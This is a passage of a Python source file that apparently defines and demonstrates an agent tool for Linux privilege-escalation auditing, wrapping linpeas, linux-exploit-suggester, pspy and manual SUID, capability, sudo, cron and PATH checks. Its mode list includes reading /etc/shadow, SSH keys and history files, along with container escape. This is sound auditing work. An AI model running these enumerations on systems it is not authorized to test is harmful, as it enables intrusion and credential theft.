                    "manual_cron", "manual_sudo", "manual_docker", "manual_env",
                ],
                "description": (
                    "full_audit       → full linpeas run (all vectors)\n"
                    "suid_sgid        → SUID/SGID binary enum (linpeas)\n"
                    "sudo_misconfig   → sudo -l + sudoers misconfigs (linpeas)\n"
                    "cron_jobs        → cron jobs + writable cron scripts (linpeas)\n"
                    "writable_paths   → world-writable files/dirs (linpeas)\n"
                    "capabilities     → dangerous linux capabilities (linpeas)\n"
                    "kernel_exploits  → kernel version → CVE suggestions (linpeas)\n"
                    "docker_lxc       → docker/lxc group + container escape (linpeas)\n"
                    "network_info     → network interfaces, ports, hosts (linpeas)\n"
                    "password_files   → /etc/shadow, .ssh keys, history files (linpeas)\n"
                    "les_kernel       → kernel CVE matching (LES)\n"
                    "les_extended     → kernel + userspace CVEs (LES)\n"
                    "pspy_procs       → passive process spy — catch cron/root procs\n"
                    "pspy_cron        → spy for UID=0 cron-triggered commands\n"
                    "manual_suid      → find / -perm -4000 (no external tool)\n"
                    "manual_caps      → getcap -r / (no external tool)\n"
                    "manual_writable  → find / -writable (no external tool)\n"
                    "manual_cron      → read all crontabs (no external tool)\n"
                    "manual_sudo      → sudo -l (no external tool)\n"
                    "manual_docker    → id → check docker/lxd group (no external tool)\n"
                    "manual_env       → env → PATH hijack detection (no external tool)"
                ),
            },
            "args": {
                "type": "array",
                "items": {"type": "string"},
                "description": (
                    "Raw tool arguments. Examples:\n"
                    "linpeas full:     ['-a']                     extended checks\n"
                    "linpeas fast:     ['-s']                     skip heavy checks\n"
                    "linpeas password: ['-P', 'Password123']      test known password\n"
                    "LES manual kern:  ['--kernel', '5.4.0-89']   override kernel ver\n"
                    "LES userspace:    ['--userspace']\n"
                    "pspy interval:    ['-i', '500', '-p']        500ms poll\n"
                    "pspy filesystem:  ['-f', '-p']               fs events + procs\n"
                    "manual_suid:      []                         no extra args needed\n"
                    "manual_caps:      []                         no extra args needed"
                ),
            },
        },
        "required": ["tool", "mode"],
    },
}


# ══════════════════════════════════════════════════════════════
# 7. USAGE EXAMPLES — WHAT AGENT CALLS
# ══════════════════════════════════════════════════════════════

if __name__ == "__main__":

    # ─────────────────────────────
    # 1. Full linpeas audit
    # ─────────────────────────────
    r = linux_privesc_audit(tool="linpeas", mode="full_audit")
    print("=== FULL AUDIT ===")
    print(json.dumps(r, indent=2))

    # ─────────────────────────────
    # 2. SUID/SGID bins only
    # ─────────────────────────────
    r = linux_privesc_audit(tool="linpeas", mode="suid_sgid")
    print("=== SUID/SGID ===")
    print(json.dumps(r, indent=2))

    # ─────────────────────────────
    # 3. Sudo misconfiguration check
    # ─────────────────────────────
    r = linux_privesc_audit(tool="linpeas", mode="sudo_misconfig")
    print("=== SUDO MISCONFIG ===")
    print(json.dumps(r, indent=2))

    # ─────────────────────────────
    # 4. Cron job enumeration
    # ─────────────────────────────
    r = linux_privesc_audit(tool="linpeas", mode="cron_jobs")
    print("=== CRON JOBS ===")
    print(json.dumps(r, indent=2))

    # ─────────────────────────────
    # 5. Dangerous capabilities
    # ─────────────────────────────
    r = linux_privesc_audit(tool="linpeas", mode="capabilities")
    print("=== CAPABILITIES ===")
    print(json.dumps(r, indent=2))

    # ─────────────────────────────
    # 6. Docker / LXC group check
    # ─────────────────────────────
    r = linux_privesc_audit(tool="linpeas", mode="docker_lxc")
    print("=== DOCKER / LXC ===")
    print(json.dumps(r, indent=2))

    # ─────────────────────────────
    # 7. Kernel CVEs via LES
    # ─────────────────────────────
    r = linux_privesc_audit(tool="linux-exploit-suggester", mode="les_kernel")
    print("=== LES KERNEL ===")
    print(json.dumps(r, indent=2))

    # ─────────────────────────────
    # 8. LES with manual kernel override
    # ─────────────────────────────
    r = linux_privesc_audit(
        tool="linux-exploit-suggester",
        mode="les_extended",
        args=["--kernel", "5.4.0-89-generic", "--userspace"],
    )
    print("=== LES EXTENDED ===")
    print(json.dumps(r, indent=2))

    # ─────────────────────────────
    # 9. pspy — watch all processes
    # ─────────────────────────────
    r = linux_privesc_audit(
        tool="pspy",
        mode="pspy_procs",
        args=["-p", "-i", "1000"],
        timeout=60,
    )
    print("=== PSPY PROCS ===")
    print(json.dumps(r, indent=2))

    # ─────────────────────────────
    # 10. pspy — catch cron root jobs
    # ─────────────────────────────
    r = linux_privesc_audit(
        tool="pspy",
        mode="pspy_cron",
        args=["-i", "250", "-p", "-f"],
        timeout=120,
    )
    print("=== PSPY CRON ===")
    print(json.dumps(r, indent=2))

    # ─────────────────────────────
    # 11. Manual SUID discovery
    # ─────────────────────────────
    r = linux_privesc_audit(tool="manual", mode="manual_suid")
    print("=== MANUAL SUID ===")
    print(json.dumps(r, indent=2))

    # ─────────────────────────────
    # 12. Manual capabilities
    # ─────────────────────────────
    r = linux_privesc_audit(tool="manual", mode="manual_caps")
    print("=== MANUAL CAPS ===")
    print(json.dumps(r, indent=2))

    # ─────────────────────────────
    # 13. Manual sudo -l
    # ─────────────────────────────
    r = linux_privesc_audit(tool="manual", mode="manual_sudo")
    print("=== MANUAL SUDO ===")
    print(json.dumps(r, indent=2))

    # ─────────────────────────────
    # 14. Manual crontab read
    # ─────────────────────────────
    r = linux_privesc_audit(tool="manual", mode="manual_cron")
    print("=== MANUAL CRON ===")
    print(json.dumps(r, indent=2))

    # ─────────────────────────────
    # 15. Docker group check
    # ─────────────────────────────
    r = linux_privesc_audit(tool="manual", mode="manual_docker")
    print("=== MANUAL DOCKER ===")
    print(json.dumps(r, indent=2))

    # ─────────────────────────────
    # 16. PATH hijack detection
    # ─────────────────────────────
    r = linux_privesc_audit(tool="manual", mode="manual_env")
    print("=== MANUAL ENV / PATH ===")
    print(json.dumps(r, indent=2))

    # ─────────────────────────────
    # 17. linpeas with known password
    # ─────────────────────────────
    r = linux_privesc_audit(
        tool="linpeas",
        mode="full_audit",
        args=["-P", "Password123"],
    )
    print("=== LINPEAS WITH PASSWORD ===")
    print(json.dumps(r, indent=2))